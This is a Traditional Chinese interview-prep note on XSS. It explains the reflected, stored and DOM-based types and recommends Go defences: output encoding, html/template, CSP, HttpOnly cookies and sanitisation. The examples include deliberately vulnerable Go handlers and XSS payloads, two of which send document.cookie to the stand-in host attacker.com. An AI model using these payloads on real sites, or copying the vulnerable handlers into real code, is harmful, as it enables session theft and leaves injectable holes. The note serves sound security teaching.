# XSS 跨站腳本攻擊

- **難度**: 6
- **重要性**: 5
- **標籤**: `Security`, `XSS`, `Web Security`

## 問題詳述

什麼是 XSS (Cross-Site Scripting) 跨站腳本攻擊？請解釋三種主要的 XSS 攻擊類型,並說明後端開發者應該如何防禦這類攻擊。

## 核心理論與詳解

XSS (Cross-Site Scripting) 是一種**注入攻擊**,攻擊者將惡意的 JavaScript 程式碼注入到受信任的網站中,當其他使用者瀏覽該頁面時,惡意腳本會在他們的瀏覽器中執行。

XSS 的危害在於:攻擊者可以在受害者的瀏覽器上下文中執行任意程式碼,竊取 Cookies、會話 Token、敏感資料,或者代替使用者執行操作。

---

### XSS 的三種主要類型

#### 1. 反射型 XSS (Reflected XSS) - 非持久型

**原理**:
惡意腳本包含在 HTTP 請求中 (通常是 URL 參數),伺服器將其直接反射 (回顯) 到回應頁面中,而沒有進行適當的過濾或編碼。

**攻擊流程**:
1.  攻擊者構造一個包含惡意腳本的 URL。
2.  誘騙受害者點擊該 URL (透過釣魚郵件、社交工程等)。
3.  受害者的瀏覽器發送請求到伺服器。
4.  伺服器將惡意腳本嵌入到回應的 HTML 中並返回。
5.  惡意腳本在受害者的瀏覽器中執行。

**範例**:

假設有一個搜尋功能,伺服器直接將搜尋關鍵字顯示在頁面上:

```go
// 脆弱的後端程式碼
func SearchHandler(w http.ResponseWriter, r *http.Request) {
    searchTerm := r.URL.Query().Get("q")
    // 直接將使用者輸入嵌入到 HTML 中
    html := fmt.Sprintf("<p>您搜尋了: %s</p>", searchTerm)
    w.Write([]byte(html))
}
```

**攻擊 URL**:
```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

受害者點擊該 URL 後,頁面會執行 `alert(document.cookie)`,攻擊者可以看到受害者的 Cookie。

**真實世界的攻擊會更隱蔽**:
```
https://example.com/search?q=<script>
fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```

#### 2. 儲存型 XSS (Stored XSS) - 持久型

**原理**:
惡意腳本被永久儲存在伺服器端 (如資料庫、檔案系統),當其他使用者訪問包含該惡意腳本的頁面時,腳本會被執行。

**攻擊流程**:
1.  攻擊者將惡意腳本提交到伺服器 (如論壇評論、使用者個人資料)。
2.  伺服器將惡意腳本儲存到資料庫中。
3.  當其他使用者瀏覽該頁面時,惡意腳本從資料庫中取出並顯示。
4.  惡意腳本在所有瀏覽該頁面的使用者瀏覽器中執行。

**範例**:

論壇評論功能:

```go
// 脆弱的程式碼
func SaveComment(content string) {
    db.Exec("INSERT INTO comments (content) VALUES (?)", content)
}

func DisplayComments() string {
    rows, _ := db.Query("SELECT content FROM comments")
    var html string
    for rows.Next() {
        var content string
        rows.Scan(&content)
        // 直接輸出,沒有編碼
        html += fmt.Sprintf("<div>%s</div>", content)
    }
    return html
}
```

攻擊者提交評論:
```html
<script>
// 竊取所有訪客的 Cookie 並發送到攻擊者伺服器
fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```

這段腳本會影響**所有瀏覽該評論的使用者**,危害範圍更大。

#### 3. DOM-based XSS (基於 DOM 的 XSS)

**原理**:
惡意腳本的執行完全發生在瀏覽器端,伺服器沒有參與。攻擊者操縱 DOM 環境,使得客戶端的 JavaScript 以不安全的方式處理資料。

**範例**:

```html
<!-- 客戶端程式碼 -->
<script>
    // 從 URL 取得參數並顯示
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    // 直接寫入 DOM,危險！
    document.getElementById('welcome').innerHTML = '歡迎, ' + name;
</script>
```

**攻擊 URL**:
```
https://example.com/welcome?name=<img src=x onerror=alert(document.cookie)>
```

惡意腳本會在客戶端執行,伺服器的日誌中可能不會留下任何記錄。

---

### 如何防禦 XSS 攻擊

#### 1. 輸出編碼 (Output Encoding) - **最關鍵**

在將使用者輸入輸出到 HTML 頁面時,必須根據上下文進行適當的編碼。

**HTML 實體編碼**:
```go
import "html"

func SafeOutput(userInput string) string {
    // 將特殊字元轉義
    return html.EscapeString(userInput)
    // < 變成 &lt;
    // > 變成 &gt;
    // & 變成 &amp;
    // " 變成 &quot;
}
```

**使用模板引擎**:
現代的模板引擎 (如 Go 的 `html/template`) 預設會自動進行編碼:

```go
import "html/template"

func RenderPage(w http.ResponseWriter, searchTerm string) {
    tmpl := template.Must(template.New("search").Parse(
        "<p>您搜尋了: {{.SearchTerm}}</p>",
    ))
    // 自動編碼,安全
    tmpl.Execute(w, struct{ SearchTerm string }{searchTerm})
}
```

#### 2. 輸入驗證與過濾

-   **白名單驗證**: 只允許預期的字元或格式。
-   **避免黑名單**: 不要試圖過濾所有危險字元 (如 `<script>`),攻擊者有無數種繞過方式。

```go
func ValidateUsername(username string) error {
    // 只允許字母數字和底線
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9_]+$`, username)
    if !matched {
        return errors.New("invalid username")
    }
    return nil
}
```

#### 3. 使用 Content Security Policy (CSP)

CSP 是一個 HTTP 回應標頭,可以限制頁面中哪些來源的腳本可以被執行。

```go
func SetSecurityHeaders(w http.ResponseWriter) {
    // 只允許來自同源的腳本
    w.Header().Set("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'")
}
```

這可以有效阻止內聯腳本 (inline scripts) 的執行,即使攻擊者成功注入了腳本,瀏覽器也會拒絕執行。

#### 4. HttpOnly 和 Secure Cookie 標誌

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session_token",
    Value:    token,
    HttpOnly: true,  // JavaScript 無法存取此 Cookie
    Secure:   true,  // 只透過 HTTPS 傳輸
    SameSite: http.SameSiteStrictMode,
})
```

`HttpOnly` 標誌可以防止 JavaScript 透過 `document.cookie` 竊取 Cookie,這是防禦 XSS 竊取會話的重要措施。

#### 5. 對於富文本內容,使用安全的清理庫

如果必須允許使用者輸入 HTML (如部落格文章、論壇),使用專門的 HTML 清理庫 (如 `bluemonday`):

```go
import "github.com/microcosm-cc/bluemonday"

func SanitizeHTML(userHTML string) string {
    // 使用嚴格策略,只允許安全的標籤和屬性
    policy := bluemonday.StrictPolicy()
    return policy.Sanitize(userHTML)
}
```

#### 6. 客戶端防禦 (針對 DOM-based XSS)

-   避免使用 `innerHTML`、`document.write()`。
-   使用 `textContent` 或 `innerText` 代替。
-   使用安全的 DOM API,如 `createElement()` 和 `appendChild()`。

```javascript
// 危險
element.innerHTML = userInput;

// 安全
element.textContent = userInput;
```

---

### 結論

XSS 攻擊是 Web 安全中最常見的威脅之一。防禦的核心原則是:**永遠不要信任使用者輸入**。無論何時將使用者輸入輸出到頁面,都必須進行適當的編碼或清理。

作為後端開發者,即使前端有防禦措施,也必須在後端實施**縱深防禦** (Defense in Depth),使用輸出編碼、CSP、安全的 Cookie 設定等多層防護,確保即使某一層失效,其他層仍能保護使用者安全。
